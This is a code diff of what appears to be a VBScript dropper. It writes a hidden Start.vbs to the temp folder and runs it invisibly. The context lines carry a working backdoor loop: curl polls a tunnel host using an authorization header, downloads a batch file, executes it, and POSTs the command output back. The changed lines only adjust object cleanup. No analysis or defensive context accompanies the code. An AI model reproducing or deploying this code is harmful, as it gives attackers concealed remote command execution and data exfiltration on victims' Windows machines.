@@ -27,8 +27,9 @@ objFile.WriteLine "WScript.Quit"
 objFile.WriteLine "End If"
 objFile.WriteLine "sh = ""@echo off&cd %userprofile%&cmd /V:ON /C """"SET ip="" & tunnel & ""&&SET sid=""""Authorization: ac3b22bb-4baa2f93-341bd899""""&&SET protocol=http://&&curl !protocol!!ip!/ac3b22bb -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/4baa2f93 -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/341bd899 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1"""" > NUL"""
 objFile.WriteLine "objShell.Run ""cmd /C "" & sh, 0, True"
-objFile.WriteLine "Set objShell = Nothing"
 objFile.WriteLine "Set objFSO = Nothing"
+objFile.WriteLine "Set objShell = Nothing"
+objFile.WriteLine "Set oHTTP = Nothing"
 objFile.WriteLine "WScript.Sleep 5000"
 objFile.WriteLine "Loop"
 objFile.WriteLine "On Error Goto 0"
@@ -39,4 +40,5 @@ objFSO.GetFile(tempPath).Attributes = objFSO.GetFile(tempPath).Attributes Or 3
 objShell.Run "%TEMP%\Start.vbs", 0, False
 Set ObjFSO = Nothing
 Set ObjShell = Nothing
+Set oHTTP = Nothing
 On Error Goto 0
